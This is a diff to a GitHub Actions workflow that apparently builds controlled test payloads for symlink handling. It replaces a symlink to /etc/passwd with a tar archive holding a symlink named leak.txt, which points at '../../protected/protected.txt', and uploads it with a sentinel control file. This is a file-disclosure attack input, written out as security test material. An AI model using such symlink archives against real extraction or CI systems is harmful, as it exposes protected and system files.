@@ -1,4 +1,4 @@
-name: G01 symlink artifact source
+name: G01 symlink archive source
 
 on:
   workflow_dispatch:
@@ -11,14 +11,18 @@ jobs:
   seed:
     runs-on: ubuntu-latest
     steps:
-      - name: Create controlled symlink payload
+      - name: Create controlled archive payload
         run: |
           rm -rf payload
           mkdir -p payload
-          ln -s /etc/passwd payload/regular-from-symlink.txt
-          printf "%s\n" "G01_SYMLINK_CONTROL_SENTINEL_20260803_A3" > payload/regular-control.txt
-      - name: Upload symlink payload
+          ln -s ../../protected/protected.txt payload/leak.txt
+          printf "%s\n" "G01_SYMLINK_ARCHIVE_CONTROL_20260803_A3" > payload/control.txt
+          tar -cf payload.tar -C payload leak.txt
+          tar -tvf payload.tar
+      - name: Upload archive payload
         uses: actions/upload-artifact@v4
         with:
-          name: g01-symlink-source-20260803-a3
-          path: payload
+          name: g01-symlink-archive-20260803-a3
+          path: |
+            payload.tar
+            payload/control.txt
